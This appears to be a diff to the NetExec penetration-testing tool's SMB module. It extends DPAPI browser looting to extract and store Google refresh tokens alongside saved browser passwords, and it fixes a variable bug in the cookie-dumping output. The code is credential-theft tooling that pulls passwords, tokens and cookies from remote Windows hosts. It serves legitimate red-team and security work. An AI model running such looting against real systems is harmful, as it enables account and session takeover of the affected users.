@@ -49,7 +49,7 @@ from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.powershell import create_ps_command
 
 from dploot.triage.vaults import VaultsTriage
-from dploot.triage.browser import BrowserTriage
+from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken
 from dploot.triage.credentials import CredentialsTriage
 from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
 from dploot.triage.backupkey import BackupkeyTriage
@@ -1470,22 +1470,34 @@ class smb(connection):
         except Exception as e:
             self.logger.debug(f"Error while looting browsers: {e}")
         for credential in browser_credentials:
-            cred_url = credential.url + " -" if credential.url != "" else "-"
-            self.logger.highlight(f"[{credential.winuser}][{credential.browser.upper()}] {cred_url} {credential.username}:{credential.password}")
-            self.db.add_dpapi_secrets(
-                target.address,
-                credential.browser.upper(),
-                credential.winuser,
-                credential.username,
-                credential.password,
-                credential.url,
-            )
+            if isinstance(credential,LoginData):
+                cred_url = credential.url + " -" if credential.url != "" else "-"
+                self.logger.highlight(f"[{credential.winuser}][{credential.browser.upper()}] {cred_url} {credential.username}:{credential.password}")
+                self.db.add_dpapi_secrets(
+                    target.address,
+                    credential.browser.upper(),
+                    credential.winuser,
+                    credential.username,
+                    credential.password,
+                    credential.url,
+                )
+            elif isinstance(credential,GoogleRefreshToken):
+                self.logger.highlight(f"[{credential.winuser}][{credential.browser.upper()}] Google Refresh Token: {credential.service}:{credential.token}")
+                self.db.add_dpapi_secrets(
+                    target.address,
+                    credential.browser.upper(),
+                    credential.winuser,
+                    credential.service,
+                    credential.token,
+                    "Google Refresh Token",
+                )
+
 
         if dump_cookies:
             self.logger.display("Start Dumping Cookies")
             for cookie in cookies:
                 if cookie.cookie_value != "":
-                    self.logger.highlight(f"[{credential.winuser}][{cookie.browser.upper()}] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}")
+                    self.logger.highlight(f"[{cookie.winuser}][{cookie.browser.upper()}] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}")
             self.logger.display("End Dumping Cookies")
 
         vaults = []
